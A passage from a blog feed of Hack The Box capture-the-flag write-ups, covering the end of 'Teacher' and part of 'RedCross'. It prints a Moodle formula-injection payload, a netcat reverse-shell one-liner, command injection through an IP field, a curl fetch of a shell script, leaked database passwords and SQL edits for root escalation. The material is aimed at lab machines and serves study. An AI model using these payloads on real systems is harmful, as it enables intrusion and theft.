RCE , Initial Shell as www-data After some enumeration I didn’t find anything interesting , so I searched on Google and found this article. Let’s try to reproduce that vulnerability. First , we will go to the Algebra course : Then we will turn editing on : Now we can edit the course , so we will choose any topic and click on Add an activity or resource and we will choose Quiz : Then we will just fill in the required information : And click on Save and display. After that we will click on edit quiz : And add a new question. Question type will be Calculated : Again we will fill in the required information : And finally we reach the actual exploitation , we will set the answer formula to : /*{a*/`$_GET[0]`;//{x}}` This will allow us to pass system commands through a url parameter called 0 , More info about how the exploit is working can be found in the previously mentioned article. After saving the changes we will get this page : We will click on Next Page to finally get to the vulnerable page : Let’s add the parameter 0 and get a reverse shell : Shell : rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc ip port &amp;gt;/tmp/f Note : the payload is url encoded. So final payload will be : &amp;amp;0=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2&amp;gt;%261|nc+ip+port+&amp;gt;/tmp/f After sending the request , our listener gets a callback. And we get a reverse shell as www-data : There is only giovanni on the box and we can’t access his /home directory as www-data. Hardcoded Database Credentials , Privilege Escalation to giovanni Back to /var/www/html/moodle , I wanted to check config files and other stuff to see if there are any information that can help. And in config.php I found database credentials : Sweet , Let’s see what’s in there. mysql -h 127.0.0.1 -u root -p We are not in any database [(none)] , Let’s list the databases : SHOW DATABASES; moodle is interesting and might have some passwords. USE moodle; Now let’s check the tables : SHOW TABLES; A lot of tables , but an interesting one is called mdl_user : Alright , let’s see what’s in that table : SELECT * from mdl_user; We didn’t get the best output :D but anyway I looked into it and found this md5 hash : And its name is Giovannibak , probably a backup for giovanni’s password. crackstation was able to crack it : The password is expelled, we can su to giovanni Now we own user. 777. Ability to read , write and execute anything on the system In giovanni’s /home directory there is a directory called work which has two directories courses and tmp. Nothing Special. After a lot of enumeration I found in /usr/bin a script called backup.sh : We don’t really care about the tar commands , What we care about is that it’s changing current directory to /home/giovanni/work then changes it once again to /home/giovanni/work/tmp then changes permissions to 777 recursively. This means that any user can read , write and execute any file in /home/giovanni/work/tmp. So if we created a symlink for /root in /home/giovanni/work/tmp and wait for the script to get executed by root (cronjob) we will have access to /root. In normal conditions creating a symlink to /root won’t let you have access to it if you don’t have the permissions to. Because it’s still linking to a directory that you are not authorized to access. But since the script runs chmod 777 on /home/giovanni/work/tmp recursively, Anyone has access to what’s in there even symlinks. This article explains it very well. Read this if you don’t know what’s a symlink. Alright , Let’s create a symlink for /root in /home/giovanni/work/tmp ln -s /root ./tmp And we owned root ! That’s it , Feedback is appreciated ! Don’t forget to read the previous write-ups , Tweet about the write-up if you liked it , follow on twitter for awesome resources @Ahm3d_H3sham Thanks for reading. Previous Hack The Box write-up : Hack The Box - RedCross Next Hack The Box write-up : Hack The Box - Irked</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/hackthebox/teacher/0.png" /></entry><entry><title type="html">Hack The Box - RedCross</title><link href="http://localhost:4000/hack-the-box/redcross/" rel="alternate" type="text/html" title="Hack The Box - RedCross" /><published>2019-04-13T00:00:00+02:00</published><updated>2019-04-13T00:00:00+02:00</updated><id>http://localhost:4000/hack-the-box/redcross</id><content type="html" xml:base="http://localhost:4000/hack-the-box/redcross/">&lt;hr /&gt;

&lt;h3 id=&quot;quick-summary&quot;&gt;Quick Summary&lt;/h3&gt;
&lt;h4 id=&quot;hey-guys-today-redcross-retired-and-here-is-my-write-up-about-it-to-get-an-initial-shell-on-this-box-there-are-two-ways--first-one-is-to-exploit-an-authenticated-rce-which-gives-you-a-shell-as-www-data--then-escalate-to-root-the-second-way-is-to-exploit-a-vulnerable-smtp-server-called-haraka-to-get-a-shell-as-user-then-escalate-to-root-both-of-the-ways-were-fun-and-i-liked-this-box-its-a-medium-rated-linux-box-and-its-ip-is-101010113-i-added-it-to-etchosts-as-redcrosshtb-lets-jump-right-in-&quot;&gt;Hey guys today RedCross retired and here is my write-up about it. To get an initial shell on this box there are two ways , first one is to exploit an authenticated RCE which gives you a shell as &lt;code class=&quot;highlighter-rouge&quot;&gt;www-data&lt;/code&gt; , then escalate to root. The second way is to exploit a vulnerable &lt;code class=&quot;highlighter-rouge&quot;&gt;smtp&lt;/code&gt; server called &lt;code class=&quot;highlighter-rouge&quot;&gt;Haraka&lt;/code&gt; to get a shell as user then escalate to root. Both of the ways were fun and I liked this box. It’s a medium-rated linux box and its ip is &lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.10.113&lt;/code&gt; I added it to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;redcross.htb&lt;/code&gt;. Let’s jump right in !&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/redcross/0.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;
&lt;h4 id=&quot;as-always-we-will-start-with-nmap-to-scan-for-open-ports-and-services-&quot;&gt;As always we will start with nmap to scan for open ports and services :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -sV -sT -sC redcross.htb&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/redcross/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;port-22-is-open-and-running-ssh--theres-http-and-https-on-ports-80-and-443-as-always-we-will-check-http&quot;&gt;Port 22 is open and running ssh , there’s http and https on ports 80 and 443. As always we will check http.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;http-initial-enumeration&quot;&gt;HTTP Initial Enumeration&lt;/h3&gt;
&lt;h4 id=&quot;by-going-to-httpredcrosshtb-it-redirects-us-to-httpsintraredcrosshtb&quot;&gt;By going to &lt;code class=&quot;highlighter-rouge&quot;&gt;http://redcross.htb&lt;/code&gt; it redirects us to &lt;code class=&quot;highlighter-rouge&quot;&gt;https://intra.redcross.htb&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/redcross/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-added-intraredcrosshtb-to-etchosts-next-to-the-ip-of-the-box-which-is-101010113&quot;&gt;I added &lt;code class=&quot;highlighter-rouge&quot;&gt;intra.redcross.htb&lt;/code&gt; to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; next to the ip of the box which is &lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.10.113&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/redcross/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;lets-go-to-intraredcrosshtb-again-&quot;&gt;Let’s go to &lt;code class=&quot;highlighter-rouge&quot;&gt;intra.redcross.htb&lt;/code&gt; again :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/redcross/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;before-doing-anything-i-wanted-to-see-if-there-are-any-other-subdomains--so-i-used-wfuzz-with-subdomains-top1mil-5000txt-from-seclists-&quot;&gt;Before doing anything I wanted to see if there are any other subdomains , so I used &lt;code class=&quot;highlighter-rouge&quot;&gt;wfuzz&lt;/code&gt; with &lt;a href=&quot;https://github.com/danielmiessler/SecLists/blob/master/Discovery/DNS/subdomains-top1mil-5000.txt&quot;&gt;subdomains-top1mil-5000.txt&lt;/a&gt; from seclists :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;wfuzz -c -w subdomains-top1mil-5000.txt -H &quot;HOST:FUZZ.redcross.htb&quot; https://redcross.htb&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/redcross/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;responses-for-non-existing-subdomains-are-28-words-so-i-stopped-the-scan-to-add---hw-28-to-filter-these-responses-&quot;&gt;Responses for non-existing subdomains are 28 words so I stopped the scan to add &lt;code class=&quot;highlighter-rouge&quot;&gt;--hw 28&lt;/code&gt; to filter these responses :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;wfuzz -c -w subdomains-top1mil-5000.txt -H &quot;HOST:FUZZ.redcross.htb&quot; https://redcross.htb&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/redcross/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-we-got-adminredcrosshtb--so-i-added-it-to-etchosts-&quot;&gt;And we got &lt;code class=&quot;highlighter-rouge&quot;&gt;admin.redcross.htb&lt;/code&gt; , So I added it to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/redcross/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;note--to-enumerate-every-subdoamin-there-has-to-be-an-entry-for-that-subdomain-in-etchosts-that-points-to-the-ip-of-the-box--thats-why-i-added-the-host-http-header--h-hostfuzzredcrosshtb--it-solves-the-problem&quot;&gt;Note : to enumerate every subdoamin there has to be an entry for that subdomain in &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; that points to the ip of the box , that’s why I added the &lt;code class=&quot;highlighter-rouge&quot;&gt;HOST&lt;/code&gt; HTTP header (&lt;code class=&quot;highlighter-rouge&quot;&gt;-H &quot;HOST:FUZZ.redcross.htb&quot;&lt;/code&gt;) , it solves the problem.&lt;/h4&gt;
&lt;h4 id=&quot;now-lets-go-to-adminredcrosshtb-and-see-whats-there-&quot;&gt;Now let’s go to &lt;code class=&quot;highlighter-rouge&quot;&gt;admin.redcross.htb&lt;/code&gt; and see what’s there :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/redcross/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;it-asks-for-login--we-will-get-into-this-later-but-lets-go-back-to-intraredcrosshtb-and-see-what-can-we-do-from-there&quot;&gt;It asks for login , we will get into this later but let’s go back to &lt;code class=&quot;highlighter-rouge&quot;&gt;intra.redcross.htb&lt;/code&gt; and see what can we do from there.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/redcross/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-need-to-login--i-tried-to-bruteforce-the-login-with-wfuzz--so-i-intercepted-the-request-with-burp-to-see-the-parameters-&quot;&gt;We need to login , I tried to bruteforce the login with wfuzz , so I intercepted the request with &lt;code class=&quot;highlighter-rouge&quot;&gt;burp&lt;/code&gt; to see the parameters :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/redcross/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;then-i-used-wfuzz-like-we-did-before-i-filtered-responses-with-32-chars-i-used-a-small-list-for-common-credentials-like-adminadmin-top-usernames-shortlisttxt-from-seclists&quot;&gt;Then I used wfuzz like we did before (I filtered responses with 32 chars). I used a small list for common credentials like &lt;code class=&quot;highlighter-rouge&quot;&gt;admin:admin&lt;/code&gt;, &lt;a href=&quot;https://github.com/danielmiessler/SecLists/blob/master/Usernames/top-usernames-shortlist.txt&quot;&gt;top-usernames-shortlist.txt&lt;/a&gt; from seclists.&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;wfuzz -c --hh 11 -u &quot;https://intra.redcross.htb/pages/actions.php&quot; -X POST -d &quot;user=FUZZ&amp;amp;pass=FUZZ&amp;amp;action=login&quot; -w top-usernames-shortlist.txt&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/redcross/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;guestguest-gave-us-a-different-response-lets-try-it-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;guest:guest&lt;/code&gt; gave us a different response. Let’s try it :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/redcross/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-it-worked-and-we-see-this-message-&quot;&gt;And it worked. And we see this message :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;From: admin (uid 1)	To: guest (uid 5)

You're granted with a low privilege access while we're processing your credentials request. Our messaging system still in beta status. Please report if you find any incidence.

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;broken-session-management--admin-panel&quot;&gt;Broken Session Management , Admin Panel&lt;/h3&gt;
&lt;h4 id=&quot;after-some-enumeration-i-found-that-after-being-authenticated-as-guest-on-intraredcrosshtb-you-can-use-the-session-id-on-adminredcrosshtb-and-it-will-work-&quot;&gt;After some enumeration I found that after being authenticated as &lt;code class=&quot;highlighter-rouge&quot;&gt;guest&lt;/code&gt; on &lt;code class=&quot;highlighter-rouge&quot;&gt;intra.redcross.htb&lt;/code&gt; you can use the session id on &lt;code class=&quot;highlighter-rouge&quot;&gt;admin.redcross.htb&lt;/code&gt; and it will work :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/redcross/12.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/redcross/13.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/redcross/14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;now-we-have-access-to-the-admin-panel--there-are-two-areas--user-management-and-network-access&quot;&gt;Now we have access to the admin panel , there are two areas : &lt;code class=&quot;highlighter-rouge&quot;&gt;User Management&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;Network Access&lt;/code&gt;&lt;/h4&gt;
&lt;h4 id=&quot;user-management-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;User Management&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/redcross/15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;can-we-really-add-users--lets-try-test-&quot;&gt;Can we really add users ? Let’s try &lt;code class=&quot;highlighter-rouge&quot;&gt;test&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/redcross/16.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/redcross/17.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;nice-it-gave-us-the-credentials--lets-try-ssh-&quot;&gt;Nice it gave us the credentials , let’s try ssh :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/redcross/18.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-it-worked--but-it-seems-like-we-are-not-on-the-actual-host--we-are-in-a-container-or-a-jail--lets-look-at-home-&quot;&gt;And it worked , but it seems like we are not on the actual host , we are in a container or a jail , let’s look at &lt;code class=&quot;highlighter-rouge&quot;&gt;/home&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/redcross/19.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;interface_data-and-public--last-thing-i-checked-was-etcpasswd-to-know-any-possible-user-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;interface_data&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;public&lt;/code&gt; ? Last thing I checked was &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt; to know any possible user :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/redcross/20.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;theres-a-user-called-penelope--but-no-home-directory-for-penelope-so-i-gave-up-on-this-and-looked-at-network-access-&quot;&gt;There’s a user called &lt;code class=&quot;highlighter-rouge&quot;&gt;penelope&lt;/code&gt; , but no &lt;code class=&quot;highlighter-rouge&quot;&gt;/home&lt;/code&gt; directory for &lt;code class=&quot;highlighter-rouge&quot;&gt;penelope&lt;/code&gt;. So I gave up on this and looked at &lt;code class=&quot;highlighter-rouge&quot;&gt;Network Access&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/redcross/21.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-added-my-ip-address-to-the-whitelist&quot;&gt;I added my ip address to the whitelist:&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/redcross/22.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;then-i-scanned-the-box-with-nmap-again-to-see-if-some-new-ports-show-up-&quot;&gt;Then I scanned the box with nmap again to see if some new ports show up :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/redcross/59.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/redcross/60.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;theres-ftp-on-port-21-anonymous-login-not-allowed-postgresql-sql-database-on-port-5432-and-a-service-on-port-1025-but-nmap-couldnt-really-identify-it-now-there-are-two-ways-to-continue--i-will-show-the-rce-first&quot;&gt;there’s ftp on port 21 (anonymous login not allowed), &lt;code class=&quot;highlighter-rouge&quot;&gt;postgresql SQL database&lt;/code&gt; on port 5432 and a service on port 1025 but nmap couldn’t really identify it. Now there are two ways to continue , I will show the RCE first.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;rce-on-adminredcrosshtb--reverse-shell-as-www-data&quot;&gt;RCE on &lt;code class=&quot;highlighter-rouge&quot;&gt;admin.redcross.htb&lt;/code&gt; , Reverse Shell as &lt;code class=&quot;highlighter-rouge&quot;&gt;www-data&lt;/code&gt;&lt;/h3&gt;
&lt;h4 id=&quot;on-the-network-access-section-you-can-add-and-remove-ips-from-the-whitelist--i-added-a-random-ip--lets-say-11111111-and-intercepted-the-two-requests-with-burp-&quot;&gt;On the &lt;code class=&quot;highlighter-rouge&quot;&gt;Network Access&lt;/code&gt; Section you can add and remove ips from the whitelist , I added a random ip , let’s say &lt;code class=&quot;highlighter-rouge&quot;&gt;11.11.11.11&lt;/code&gt; and intercepted the two requests with &lt;code class=&quot;highlighter-rouge&quot;&gt;burp&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/redcross/23.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;allow-request-&quot;&gt;Allow request :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/redcross/24.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;response-&quot;&gt;Response :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/redcross/25.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;deny-request-&quot;&gt;Deny request :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/redcross/26.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;response--1&quot;&gt;Response :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/redcross/27.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-notice-that-its-saying-executing-iptables--so-the-ip-we-provide-will-be-a-part-of-a-system-command-i-added-ls-to-the-ip-parameter-in-the-deny-request-and-got-this-response-&quot;&gt;We notice that it’s saying &lt;code class=&quot;highlighter-rouge&quot;&gt;Executing iptables&lt;/code&gt; , so the ip we provide will be a part of a system command. I added &lt;code class=&quot;highlighter-rouge&quot;&gt;|ls&lt;/code&gt; to the ip parameter in the deny request and got this response :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/redcross/28.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/redcross/29.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;nice-we-have-an-rce--lets-get-a-reverse-shell--i-created-a-reverse-shell-and-called-it-shellsh-&quot;&gt;Nice we have an RCE , let’s get a reverse shell , I created a reverse shell and called it &lt;code class=&quot;highlighter-rouge&quot;&gt;shell.sh&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/redcross/30.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;then-i-hosted-it-on-a-python-simple-http-server--and-downloaded-it-on-the-box--curl-http1010xxxxshellsh--tmpshellsh&quot;&gt;Then I hosted it on a python simple HTTP server , and downloaded it on the box : &lt;code class=&quot;highlighter-rouge&quot;&gt;curl http://10.10.xx.xx/shell.sh &amp;gt; /tmp/shell.sh&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/redcross/31.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;python-server-&quot;&gt;Python Server :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/redcross/32.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;lets-verify-that-the-shell-is-on-the-box-&quot;&gt;Let’s verify that the shell is on the box :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/redcross/33.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/redcross/34.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;nice-lets-execute-&quot;&gt;Nice let’s execute :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;bash /tmp/shell.sh&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/redcross/35.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/redcross/36.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-got-a-shell-as-www-data-&quot;&gt;We got a shell as &lt;code class=&quot;highlighter-rouge&quot;&gt;www-data&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/redcross/37.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-we-see-in-home-a-directory-for-penelope--but-we-cant-read-the-user-flag&quot;&gt;And we see in &lt;code class=&quot;highlighter-rouge&quot;&gt;/home&lt;/code&gt; a directory for &lt;code class=&quot;highlighter-rouge&quot;&gt;penelope&lt;/code&gt; , but we can’t read the user flag.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/redcross/38.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;hardcoded-postgresql-database-credentials--privilege-escalation-to-root&quot;&gt;Hardcoded PostgreSQL Database Credentials , Privilege Escalation to root&lt;/h3&gt;
&lt;h4 id=&quot;in-the-root-directory-of-the-web-application--theres-an-interseting-php-file-called-actionsphp-interesting-because-it-handled-everything--we-saw-it-earlier-in-all-the-post-requests-i-looked-into-it-and-found-credentials-for-a-db-user-called-unixusrmgr-&quot;&gt;In the root directory of the web application , there’s an interseting &lt;code class=&quot;highlighter-rouge&quot;&gt;php&lt;/code&gt; file called &lt;code class=&quot;highlighter-rouge&quot;&gt;actions.php&lt;/code&gt;. Interesting because it handled everything , we saw it earlier in all the POST requests. I looked into it and found credentials for a db user called &lt;code class=&quot;highlighter-rouge&quot;&gt;unixusrmgr&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/redcross/40.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;if($action==='del'){
        header('refresh:1;url=/?page=users');
        $uid=$_POST['uid'];
        $dbconn = pg_connect(&quot;host=10.10.10.113 dbname=unix user=unixusrmgr password=dheu%7wjx8B&amp;amp;&quot;);
        $result = pg_prepare($dbconn, &quot;q1&quot;, &quot;delete from passwd_table where uid = $1&quot;);
        $result = pg_execute($dbconn, &quot;q1&quot;, array($uid));
        echo &quot;User account deleted&quot;;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;we-knew-earlier-that-the-database-is-postgresql--lets-connect-&quot;&gt;We knew earlier that the database is &lt;code class=&quot;highlighter-rouge&quot;&gt;PostgreSQL&lt;/code&gt; , let’s connect :&lt;/h4&gt;
&lt;h4 id=&quot;some-cheatcheets-for-postgresql-&quot;&gt;Some Cheatcheets for &lt;code class=&quot;highlighter-rouge&quot;&gt;PostgreSQL&lt;/code&gt; :&lt;/h4&gt;
&lt;h4 id=&quot;github&quot;&gt;&lt;a href=&quot;https://gist.github.com/Kartones/dd3ff5ec5ea238d4c546&quot;&gt;Github&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;postgresqltutorialcom&quot;&gt;&lt;a href=&quot;http://www.postgresqltutorial.com/postgresql-cheat-sheet/&quot;&gt;postgresqltutorial.com&lt;/a&gt;&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;psql -h 127.0.0.1 -d unix -U unixusrmgr&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/redcross/41.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;dt-to-list-the-tables-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;\dt&lt;/code&gt; to list the tables :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/redcross/42.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-did-select--from-passwd_table-and-got-some-users-with-their-password-hashes-and-other-info--so-i-went-back-to-the-admin-panel-and-added-a-user-called-rick-&quot;&gt;I did &lt;code class=&quot;highlighter-rouge&quot;&gt;select * from passwd_table;&lt;/code&gt; and got some users with their password hashes and other info , so I went back to the admin panel and added a user called &lt;code class=&quot;highlighter-rouge&quot;&gt;rick&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/redcross/43.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;then-i-did-select--from-passwd_table-again-&quot;&gt;Then I did &lt;code class=&quot;highlighter-rouge&quot;&gt;select * from passwd_table;&lt;/code&gt; again :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/redcross/44.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-notice-that-the-homedir-is-set-to-varjailhome-thats-why-we-cant-access-the-actual-host-with-created-users-also-the-gid-is-set-to-1001-lets-set-that-to-0-root-&quot;&gt;We notice that the &lt;code class=&quot;highlighter-rouge&quot;&gt;homedir&lt;/code&gt; is set to &lt;code class=&quot;highlighter-rouge&quot;&gt;/var/jail/home&lt;/code&gt; that’s why we can’t access the actual host with created users. Also the &lt;code class=&quot;highlighter-rouge&quot;&gt;gid&lt;/code&gt; is set to &lt;code class=&quot;highlighter-rouge&quot;&gt;1001&lt;/code&gt;. Let’s set that to &lt;code class=&quot;highlighter-rouge&quot;&gt;0&lt;/code&gt; (root) :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;update passwd_table set gid=0 where gid=1001;&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/redcross/45.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;now-the-gid-is-0-&quot;&gt;Now the &lt;code class=&quot;highlighter-rouge&quot;&gt;gid&lt;/code&gt; is &lt;code class=&quot;highlighter-rouge&quot;&gt;0&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/redcross/46.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;lets-also-change-the-homedir-&quot;&gt;Let’s also change the &lt;code class=&quot;highlighter-rouge&quot;&gt;homedir&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;update passwd_table set homedir='/home' where homedir='/var/jail/home';&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/redcross/47.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
